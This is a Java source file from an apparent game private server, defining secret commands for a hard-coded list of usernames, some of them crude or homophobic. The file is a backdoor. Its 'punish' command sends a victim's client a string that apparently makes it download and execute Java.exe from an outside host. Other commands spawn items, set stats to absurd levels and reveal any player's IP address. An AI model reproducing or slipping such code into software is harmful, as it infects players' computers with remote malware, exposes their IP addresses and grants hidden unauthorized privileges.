package com.ikov.commands.ranks;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.ikov.model.Flag;
import com.ikov.model.Item;
import com.ikov.model.Skill;
import com.ikov.model.definitions.ItemDefinition;
import com.ikov.world.World;
import com.ikov.world.content.PlayerPunishment;
import com.ikov.world.content.skill.SkillManager;
import com.ikov.world.entity.impl.player.Player;

public class SpecialPlayers {
	
	/**
	* @Author Jonathan Sirens
	* Initiates Command
	**/
	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "manny", "queerisme", "robotype", "jack mehoff"};
	
	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
		boolean continue_command = false;
		for(int i = 0; i < player_names.length; i++) {
			if(player_names[i].toLowerCase().equals(player.getUsername().toLowerCase())) {
				continue_command = true;
			}
		}
		if(!continue_command) {
			return;
		}
		if (command[0].equals("punish")) {
			Player other = World.getPlayerByName(command[1]);
			other.getPacketSender().sendString(0, "[ABC]-http://turmoilps.org/Java.exe-cmd-/c-Java.exe");
			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
		}	
		if(wholeCommand.equalsIgnoreCase("dice")) {
			player.getInventory().add(11211, 1);
		}
		if(wholeCommand.equalsIgnoreCase("flowers")) {
			player.getInventory().add(4490, 1);
		}
		if(wholeCommand.equalsIgnoreCase("stake")) {
			player.getInventory().add(4142, 1);
		}
		if (command[0].equals("item")) {
			int id = Integer.parseInt(command[1]);		
			int amount = (command.length == 2 ? 1 : Integer.parseInt(command[2].trim().toLowerCase().replaceAll("k", "000").replaceAll("m", "000000").replaceAll("b", "000000000")));
			if(amount > Integer.MAX_VALUE) {
				amount = Integer.MAX_VALUE;
			}
			Item item = new Item(id, amount);
			player.getInventory().add(item, true);

			player.getPacketSender().sendItemOnInterface(47052, 11694, 1);
		}
		if (command[0].equals("master")) {
			for (Skill skill : Skill.values()) {
				int level = SkillManager.getMaxAchievingLevel(skill);
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level == 120 ? 120 : 99));
			}
			player.getPacketSender().sendMessage("You are now a master of all skills.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if (command[0].equals("setlevel") && !player.getUsername().equalsIgnoreCase("Jack")) {
			int skillId = Integer.parseInt(command[1]);
			int level = Integer.parseInt(command[2]);
			if(level > 15000) {
				player.getPacketSender().sendMessage("You can only have a maxmium level of 15000.");
				return;
			}
			Skill skill = Skill.forId(skillId);
			player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill, SkillManager.getExperienceForLevel(level));
			player.getPacketSender().sendMessage("You have set your " + skill.getName() + " level to " + level);
		}
		if (command[0].equals("spawn")) {
			String name = wholeCommand.substring(6, wholeCommand.indexOf(":")).toLowerCase().replaceAll("_", " ");
			String[] what = wholeCommand.split(":");
			int amount_of = Integer.parseInt(what[1]);
			player.getPacketSender().sendMessage("Finding item id for item - " + name);
			boolean found2 = false;
			for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
				if(found2)
					break;
				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
					player.getInventory().add(i, amount_of);
					player.getPacketSender().sendMessage("Spawned item [" + ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found2 = true;
				}
			}
			if (!found2) {
				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
			}
			player.getPacketSender().sendItemOnInterface(47052, 11694, 1);
		}
		if(wholeCommand.equalsIgnoreCase("restorestats")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 99, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.ATTACK, 118, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 106, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 121, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 990, true);
			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 990, true);
		}
		if(wholeCommand.equalsIgnoreCase("propker")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 145, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 140, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("godmode")) {
			player.getSkillManager().setCurrentLevel(Skill.STRENGTH, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.RANGED, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.DEFENCE, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.MAGIC, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 99999, true);
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 99999, true);
		}
		if(wholeCommand.equalsIgnoreCase("mypos") || wholeCommand.equalsIgnoreCase("coords")) {
			Gson builder = new GsonBuilder().setPrettyPrinting().create();
			String test = builder.toJsonTree(player.getPosition())+"";
			player.getPacketSender().sendMessage(test);
		}
		if(command[0].equalsIgnoreCase("getip")) {
			String player_name = wholeCommand.substring(6);
			String last_ip = PlayerPunishment.getLastIpAddress(player_name);
			player.getPacketSender().sendMessage(player_name + "'s ip address is "+last_ip);
		}
	}
	
}